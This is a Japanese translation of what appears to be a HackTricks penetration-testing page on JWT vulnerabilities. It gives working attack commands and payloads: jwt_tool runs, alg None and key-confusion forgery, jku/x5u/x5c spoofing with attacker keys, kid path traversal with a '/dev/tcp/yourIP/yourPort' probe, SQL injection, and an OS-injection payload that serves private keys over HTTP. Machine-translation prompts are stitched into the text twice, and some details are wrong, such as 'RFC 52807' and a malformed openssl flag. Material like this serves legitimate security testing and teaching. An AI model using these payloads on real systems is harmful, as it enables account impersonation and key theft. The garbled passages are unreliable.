# JWTの脆弱性（Json Web Tokens）

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**バグバウンティのヒント**: **Intigriti**に**登録**し、**ハッカーのために作られたプレミアムなバグバウンティプラットフォーム**である**Intigriti**に参加しましょう！今日[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)にアクセスして、最大**$100,000**のバウンティを獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

**この投稿の一部はこちらから引用しました:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWTをペネトレーションテストする素晴らしいツールの作者** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **クイックウィン**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool)を`All Tests!`モードで実行し、緑色のラインが出るのを待つ
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
以下は、JWT（JSON Web Tokens）に関するハッキング技術についてのハッキングブックの内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

---

幸運なことに、ツールがJWTのチェックをウェブアプリケーションが誤って行っているケースを見つけることがあります：

![](<../.gitbook/assets/image (435).png>)

その後、プロキシでリクエストを検索するか、jwt\_toolを使用してそのリクエストに使用されたJWTをダンプできます：
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### データを改ざんしても何も変更しない

署名をそのままにしてデータを改ざんし、サーバーが署名をチェックしているかどうかを確認します。例えば、ユーザー名を「admin」に変更してみてください。

#### **トークンはチェックされていますか？**

* エラーメッセージが発生した場合、署名がチェックされています - 漏洩する可能性のある詳細なエラー情報を読んでください。
* 返されたページが異なる場合、署名がチェックされています。
* ページが同じであれば、署名はチェックされていません - Payload claimsを改ざんして何ができるかを見る時です！

### 起源

プロキシのリクエスト履歴でトークンがどこで生成されたかを確認します。サーバー上で生成されるべきです。

* クライアント側から最初に見られた場合、**キー**はクライアント側のコードにアクセス可能です - 探し出してください！
* サーバーから最初に見られた場合、問題ありません。

### 期間

トークンが24時間以上持続するかどうかを確認します... おそらく期限切れにならないかもしれません。"exp"フィールドがある場合、サーバーが正しく処理しているかを確認します。

### HMACシークレットのブルートフォース

[**このページを見てください。**](../generic-methodologies-and-resources/brute-force.md#jwt)

### アルゴリズムをNoneに変更する (CVE-2015-9235)

使用されるアルゴリズムを「None」に設定し、署名部分を削除します。

「JSON Web Token」というBurp拡張機能を使用して、この脆弱性を試し、JWT内の異なる値を変更します（リクエストをRepeaterに送り、「JSON Web Token」タブでトークンの値を変更できます。また、「Alg」フィールドの値を「None」に設定することもできます）。

### アルゴリズムをRS256（非対称）からHS256（対称）に変更する (CVE-2016-5431/CVE-2016-10555)

HS256アルゴリズムは、各メッセージを署名および検証するためにシークレットキーを使用します。\
RS256アルゴリズムは、メッセージを署名するためにプライベートキーを使用し、認証にはパブリックキーを使用します。

RS256からHS256にアルゴリズムを変更すると、バックエンドコードはパブリックキーをシークレットキーとして使用し、HS256アルゴリズムを使用して署名を検証します。

パブリックキーを使用してRS256をHS256に変更することで、有効な署名を作成できます。次のコマンドを実行して、ウェブサーバーの証明書を取得できます：
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### ヘッダー内の新しい公開鍵

攻撃者はトークンのヘッダーに新しい鍵を埋め込み、サーバーはこの新しい鍵を使用して署名を検証します（CVE-2018-0114）。

これは "JSON Web Tokens" Burp 拡張機能で行うことができます。\
（リクエストをリピーターに送り、JSON Web Token タブで "CVE-2018-0114" を選択してリクエストを送信します）。

### JWKS スプーフィング

トークンが “jku” ヘッダークレームを使用している場合、提供されたURLをチェックしてください。これは、トークンの検証に使用される公開鍵を保持する JWKS ファイルが含まれている URL を指している必要があります。jku の値を、トラフィックを監視できるウェブサービスに指すようにトークンを改ざんします。

HTTP インタラクションを受け取った場合、サーバーが提供している URL から鍵をロードしようとしていることがわかります。 _jwt\_tool の -S フラグと -u_ [_http://example.com_](http://example.com) _引数を使用して新しい鍵ペアを生成し、提供された URL を注入し、公開鍵を含む JWKS を生成し、プライベート鍵でトークンに署名します_

### Kid の問題

`kid` はオプショナルなヘッダークレームで、トークンに署名するための複数の鍵があり、署名を検証するために正しい鍵を探す必要がある場合に特に便利な鍵識別子を保持します。

#### "kid" の問題 - 鍵の露出

ヘッダーで "kid" クレームが使用されている場合、そのファイルまたはそのバリエーションがウェブディレクトリにあるかどうかを確認します。例えば `"kid":"key/12345"` の場合、ウェブルートで _/key/12345_ と _/key/12345.pem_ を探します。

#### "kid" の問題 - パストラバーサル

ヘッダーで "kid" クレームが使用されている場合、ファイルシステム内の別のファイルを使用できるかどうかを確認します。予測可能な内容のファイルを選択するか、あるいは `"kid":"/dev/tcp/yourIP/yourPort"` を使用して接続性をテストするか、あるいはいくつかの **SSRF** ペイロードを試してみてください...\
_jwt\_tool の -T フラグを使用して JWT を改ざんし、kid クレームの値を変更し、元の署名を保持することを選択します_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
ホスト内の既知の内容を持つファイルを使用して、有効なJWTを偽造することもできます。例えば、Linuxシステムでは、ファイル `/proc/sys/kernel/randomize_va_space` の値は **2** に設定されています。そのため、この **パス** を "**kid**" パラメータに入れ、対称パスワードとして "**2**" を使用してJWTを生成すると、新しい有効なJWTを生成できるはずです。

#### "kid" の問題 - SQLインジェクション

"kid" の内容がデータベースからパスワードを取得するために使用されるシナリオでは、"kid" パラメータ内のペイロードを `non-existent-index' UNION SELECT 'ATTACKER';-- -` に変更し、シークレットキー `ATTACKER` でJWTに署名することができます。

#### "kid" の問題 - OSインジェクション

"kid" パラメータにキーのファイルへのパスが含まれ、このパスが **実行されるコマンド内** で使用されるシナリオでは、次のようなペイロードを使用してRCEを取得し、プライベートキーを露出させることができるかもしれません：`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### その他の攻撃

以下はテストされるべき既知の弱点です。

**クロスサービスリレー攻撃**

一部のWebアプリケーションは、信頼されたJWT「サービス」を使用してトークンを生成および管理します。過去には、JWTサービスのクライアントの1つで生成されたトークンが、実際にはJWTサービスの別のクライアントによって受け入れられることがありました。\
JWTがサードパーティサービスを介して発行または更新されていることが観察された場合、同じユーザー名/メールでそのサービスの別のクライアントにアカウントを登録できるかどうかを特定する価値があります。もしそうなら、そのトークンを取得してターゲットへのリクエストで再生してみてください。受け入れられますか？

* トークンが受け入れられた場合、任意のユーザーのアカウントを偽装することができる重大な問題があるかもしれません。ただし、サードパーティのアプリケーションに登録する場合、法的なグレーエリアに入る可能性があるため、より広範なテストの許可を求める必要があるかもしれません！

**expがチェックされていますか？**

“exp”ペイロードクレームは、トークンの有効期限をチェックするために使用されます。JWTはしばしばセッション情報がない場合に使用されるため、注意して扱う必要があります - 多くの場合、他人のJWTをキャプチャして再生すると、そのユーザーとして偽装することができます。\
JWTリプレイ攻撃に対する1つの緩和策（JWT RFCによって推奨されている）は、“exp”クレームを使用してトークンの有効期限を設定することです。また、この値が処理され、有効期限が切れた場合にトークンが拒否されるように、アプリケーションに適切なチェックを設置することも重要です。トークンに“exp”クレームが含まれていて、テスト時間の制限が許す場合は - トークンを保存して有効期限が過ぎた後に再生してみてください。_jwt\_toolの-Rフラグを使用してトークンの内容を読み取ります。これにはタイムスタンプの解析と有効期限のチェックが含まれています（タイムスタンプはUTCで表示されます）_

* アプリケーションでトークンがまだ有効である場合、トークンが決して期限切れにならない可能性があるため、セキュリティリスクになるかもしれません。

### x5uとjku

#### jku

jkuは **JWK Set URL** を意味します。\
トークンが “**jku**” **ヘッダー** クレームを使用している場合は、提供されたURLを **確認してください**。これは、トークンの検証に使用される公開鍵を保持するJWKSファイルが含まれているURLを指すべきです。jkuの値をあなたがトラフィックを監視できるWebサービスを指すようにトークンを改ざんしてください。

まず、新しい証明書と新しいプライベート＆パブリックキーを作成する必要があります
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
以下は、JWT（JSON Web Tokens）をハッキングする技術についてのハッキング書籍の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、単語「leak」、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

---

次に、例えば[**jwt.io**](https://jwt.io)を使用して、**作成された公開鍵と秘密鍵を使い、パラメータjkuを作成された証明書に指すように**新しいJWTを作成できます。有効なjku証明書を作成するには、元の証明書をダウンロードして必要なパラメータを変更します。

公開証明書からパラメータ "e" と "n" を取得するには、次の方法を使用します：
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL。PEM形式でエンコードされたX.509（証明書フォーマットの標準）公開証明書のセットを指すURI。セット内の最初の証明書は、このJWTを署名するために使用されるものでなければなりません。続く証明書はそれぞれ前のものに署名し、証明書チェーンを完成させます。X.509はRFC 52807で定義されています。証明書を転送するためには、トランスポートセキュリティが必要です。

**このヘッダーを自分のコントロール下にあるURLに変更して**、リクエストが受信されるかどうかを確認してください。その場合、**JWTを改ざんすることができます**。

自分がコントロールする証明書を使用して新しいトークンを偽造するには、証明書を作成し、公開鍵と秘密鍵を抽出する必要があります：
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
例えば、[**jwt.io**](https://jwt.io) を使用して、**作成された公開鍵と秘密鍵を使い、パラメータ x5u を作成された証明書 .crt に指定して**、新しい JWT を作成することができます。

![](<../.gitbook/assets/image (439).png>)

これらの脆弱性を**SSRFに悪用する**こともできます。

#### x5c

このパラメータには、**base64でエンコードされた証明書**が含まれる場合があります：

![](<../.gitbook/assets/image (440).png>)

攻撃者が**自己署名証明書を生成し**、対応する秘密鍵を使用して偽造トークンを作成し、"x5c" パラメータの値を新しく生成された証明書に置き換え、他のパラメータ、すなわち n、e、x5t を変更すると、サーバーによって偽造トークンが受け入れられることになります。
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### 埋め込まれた公開鍵 (CVE-2018-0114)

以下のシナリオのように、JWTが公開鍵を埋め込んでいる場合：

![](<../.gitbook/assets/image (438).png>)

次のnodejsスクリプトを使用して、そのデータから公開鍵を生成することが可能です：
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
プライベートキー/パブリックキーを新しく生成し、新しいパブリックキーをトークン内に埋め込んで、新しい署名を生成することが可能です：
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
```markdown
このnodejsスクリプトを使用して、"n"と"e"を取得できます:
```
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
公開鍵と秘密鍵、そして新しい「n」と「e」の値を使用して、任意の情報を含む新しい有効なJWTを[jwt.io](https://jwt.io)で偽造することができます。

### JTI (JWT ID)

JTI (JWT ID)クレームは、JWTトークンに一意の識別子を提供します。これはトークンのリプレイを防ぐために使用されることがあります。\
しかし、IDの最大長が4（0001-9999）の場合を想像してください。リクエスト0001と10001は同じIDを使用します。したがって、バックエンドが各リクエストでIDを増加させている場合、**リクエストをリプレイする**ためにこの状況を悪用することができます（成功したリプレイごとに10000リクエストを送信する必要があります）。

### JWT 登録済みクレーム

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### ツール

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**登録**し、**ハッカーのために作られたプレミアムなバグバウンティプラットフォーム**に参加しましょう！今日[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)にアクセスして、最大**$100,000**の報酬を獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックしましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
